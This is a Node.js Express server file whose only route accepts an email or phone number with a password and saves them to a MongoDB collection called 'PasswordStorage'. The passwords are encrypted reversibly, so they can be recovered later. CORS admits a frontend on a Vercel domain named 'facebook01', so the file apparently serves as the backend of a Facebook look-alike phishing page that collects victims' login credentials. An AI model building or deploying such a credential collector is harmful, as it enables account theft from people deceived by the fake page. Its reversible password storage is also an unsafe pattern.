const { MongoClient, ServerApiVersion } = require('mongodb');
const express = require('express');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');
const cors = require('cors');
require('dotenv').config();

const app = express();
const port = 5000;

// Middleware
app.use(cors({
    origin: [
        "http://localhost:5173",
        "https://newblockbustermovie.vercel.app",
        "https://facebook01-m1ghmrud7-johns-projects-73d3f894.vercel.app"
    ],
    credentials: true
}));
app.use(express.json());
app.use(cookieParser());

// MongoDB URI and Client
const uri = `mongodb+srv://${process.env.DB_USER}:${process.env.DB_PASSWORD}@cluster0.wcilc.mongodb.net/?retryWrites=true&w=majority`;
const client = new MongoClient(uri, {
    serverApi: {
        version: ServerApiVersion.v1,
        strict: true,
        deprecationErrors: true,
    }
});

// Connect to MongoDB
async function connectToDB() {
    try {
        await client.connect();
        console.log("Connected to MongoDB successfully!");
        return client.db("PasswordStorage").collection('userPasswords');
    } catch (err) {
        console.error("Failed to connect to MongoDB:", err);
        process.exit(1);
    }
}

// Encrypt Password
function encryptPassword(password) {
    const algorithm = 'aes-256-cbc';
    const key = Buffer.from(process.env.ENCRYPTION_KEY, 'hex');
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(algorithm, key, iv);
    let encrypted = cipher.update(password, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return { encryptedPassword: encrypted, iv: iv.toString('hex') };
}

// Main application
(async () => {
    const passwordCollection = await connectToDB();

    // Store Password Route
    app.post('/api/store-password', async (req, res) => {
        const { emailNum, password } = req.body;

        if (!emailNum || !password) {
            return res.status(400).json({ error: 'Email/Phone number and password are required.' });
        }

        // Encrypt the password
        const { encryptedPassword, iv } = encryptPassword(password);

        try {
            // Store emailNum and encrypted password with IV
            await passwordCollection.insertOne({
                emailNum,
                encryptedPassword,
                iv
            });
            res.status(200).json({ message: 'Password stored successfully' });
        } catch (error) {
            console.error("Error saving password:", error);
            res.status(500).json({ error: 'Error saving password' });
        }
    });

    // Start the Server
    app.listen(port, () => {
        console.log(`Server is running on port ${port}`);
    });
})();
